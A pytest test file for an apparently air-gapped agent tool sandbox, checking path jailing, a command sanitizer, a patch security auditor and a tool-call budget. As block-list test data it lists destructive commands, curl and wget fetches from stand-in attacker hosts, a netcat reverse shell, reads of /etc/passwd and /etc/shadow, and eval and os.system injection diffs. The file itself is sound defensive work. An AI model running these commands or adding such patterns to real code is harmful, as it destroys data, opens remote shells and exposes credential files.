"""
tests/test_sandbox.py
====================
Validates the security, path-jailing, command sanitization, and SAST auditing
of the air-gapped ToolSandbox.
"""

import sys
import tempfile
from pathlib import Path
import pytest

from tools.sandbox import (
    ToolSandbox,
    PathJail,
    CommandSanitizer,
    PatchSecurityAuditor,
    SecurityJailViolation,
    CommandSecurityViolation,
)


def test_path_jail_containment():
    with tempfile.TemporaryDirectory() as tmp_dir:
        ws = Path(tmp_dir) / "workspace"
        ws.mkdir()
        jail = PathJail(workspace=ws, allowed_scratch=Path(tmp_dir) / "scratch")

        # 1. Allowed paths within workspace
        safe_file = ws / "module.py"
        safe_file.write_text("print('safe')", encoding="utf-8")
        assert jail.validate_read_path("module.py") == safe_file.resolve()
        assert jail.validate_write_path("module.py") == safe_file.resolve()

        # 2. Block path traversal attempts
        with pytest.raises(SecurityJailViolation):
            jail.validate_read_path("../../../etc/passwd")

        with pytest.raises(SecurityJailViolation):
            jail.validate_write_path("../../../outside.txt")


def test_command_sanitizer():
    # Destructive commands must be blocked
    destructive_cmds = [
        "rm -rf /",
        "rm -rf /*",
        "mkfs.ext4 /dev/sda1",
        ":(){ :|:& };:",
    ]
    for cmd in destructive_cmds:
        with pytest.raises(CommandSecurityViolation):
            CommandSanitizer.sanitize(cmd)

    # Unauthorized network tools must be blocked in air-gapped mode
    network_cmds = [
        "curl https://evil.com/payload",
        "wget http://attacker.com/script.sh",
        "nc -e /bin/sh 10.0.0.1 4444",
    ]
    for cmd in network_cmds:
        with pytest.raises(CommandSecurityViolation):
            CommandSanitizer.sanitize(cmd)

    # Safe commands must pass
    safe_cmds = [
        "pytest tests/",
        "git status --short",
        "python -c 'print(1+1)'",
        "rg -n 'def test' .",
    ]
    for cmd in safe_cmds:
        CommandSanitizer.sanitize(cmd)  # Should not raise


def test_sast_patch_security_auditor():
    # Safe patch
    safe_diff = """--- a/flask/blueprints.py
+++ b/flask/blueprints.py
@@ -10,3 +10,5 @@
+        if "." in name:
+            raise ValueError("Blueprint names may not contain dots ('.').")
"""
    is_safe, violations = PatchSecurityAuditor.audit_diff(safe_diff)
    assert is_safe
    assert len(violations) == 0

    # Malicious patch: eval injection
    malicious_diff_1 = """--- a/flask/blueprints.py
+++ b/flask/blueprints.py
@@ -10,3 +10,5 @@
+        eval(user_input)
"""
    is_safe, violations = PatchSecurityAuditor.audit_diff(malicious_diff_1)
    assert not is_safe
    assert any("eval" in v for v in violations)

    # Malicious patch: os.system injection
    malicious_diff_2 = """--- a/flask/blueprints.py
+++ b/flask/blueprints.py
@@ -10,3 +10,5 @@
+        os.system("rm -rf /")
"""
    is_safe, violations = PatchSecurityAuditor.audit_diff(malicious_diff_2)
    assert not is_safe
    assert any("os.system" in v for v in violations)


def test_tool_sandbox_execution_and_budget():
    with tempfile.TemporaryDirectory() as tmp_dir:
        sandbox = ToolSandbox(workspace_dir=tmp_dir, max_tool_budget=5)

        # 1. Write file (Call 1)
        res = sandbox.write_file(path="test.py", content="x = 10\nprint(x)")
        assert "SUCCESS" in res

        # 2. Read file (Call 2)
        content = sandbox.read_file(path="test.py")
        assert "1: x = 10" in content
        assert "2: print(x)" in content

        # 3. Edit file (Call 3)
        res = sandbox.edit_file(path="test.py", target="x = 10", replacement="x = 42")
        assert "SUCCESS" in res
        updated = sandbox.read_file(path="test.py")  # Call 4
        assert "x = 42" in updated

        # 4. Attempt to read outside workspace (Call 5)
        blocked = sandbox.read_file(path="/etc/shadow")
        assert "SECURITY_ERROR" in blocked

        assert sandbox.calls_made == 5

        # 6th call exceeds budget
        with pytest.raises(RuntimeError) as exc_info:
            sandbox.run_command("python --version")
        assert "Tool call budget exceeded" in str(exc_info.value)
